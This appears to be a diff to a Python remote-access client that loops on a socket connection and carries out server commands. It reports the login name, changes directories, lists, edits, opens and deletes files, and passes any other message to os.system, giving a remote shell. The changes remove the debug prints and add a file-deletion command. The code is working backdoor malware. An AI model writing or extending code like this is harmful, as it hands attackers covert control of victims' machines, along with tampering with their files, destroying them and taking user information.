@@ -20,7 +20,6 @@ while True:
     try:
         msg = s.recv(1024)
         msg = msg.decode()
-        print(msg)
         if msg.lower().startswith('!getusername'):
             login = os.getlogin()
             msgtoserv = login.encode()
@@ -37,10 +36,13 @@ while True:
             s.send(msgtoserv)
             msg = ''
         elif msg.lower().startswith('!changedir'):
-            msg = msg.split()
-            direc = msg[1]
             try:
-                os.chdir(direc)
+                msg = msg.split()
+                direc = msg[1]
+                try:
+                    os.chdir(direc)
+                except:
+                    pass
             except:
                 pass
         elif msg.lower().startswith('!listdir'):
@@ -105,19 +107,14 @@ while True:
                     pass
         elif msg.lower().startswith('!openfile'):
             try:
-                print("Opening a file")
                 msg = msg.split()
-                print(msg)
                 filename = msg[1]
-                print(filename)
                 final_code = []
                 file = open(filename, 'r')
                 file_code = file.readlines()
-                print(file_code)
                 final_code.extend('\n')
                 final_code.extend(file_code)
                 final_code.extend('\n')
-                print(final_code)
                 file = open(filename, 'w')
                 file.writelines(final_code)
                 file.close()
@@ -125,7 +122,6 @@ while True:
                 s.send(msgtoserv)
                 while True:
                     msg = s.recv(1024).decode()
-                    print(msg)
                     if msg.lower().startswith('!stop'):
                         break
                     elif msg.lower().startswith('!viewlines'):
@@ -157,6 +153,21 @@ while True:
             msg = msg.split()
             filename = msg[1]
             os.startfile(filename)
+        elif msg.lower().startswith('!delfile'):
+            try:
+                msg = msg.split()
+                filename = msg[1]
+                dirlist = os.listdir()
+                for file in dirlist:
+                    if file == filename:
+                        try:
+                            os.remove(filename)
+                        except:
+                            os.rmdir(filename)
+                    else:
+                        pass
+            except:
+                pass
         else:
             os.system(msg)
     except:
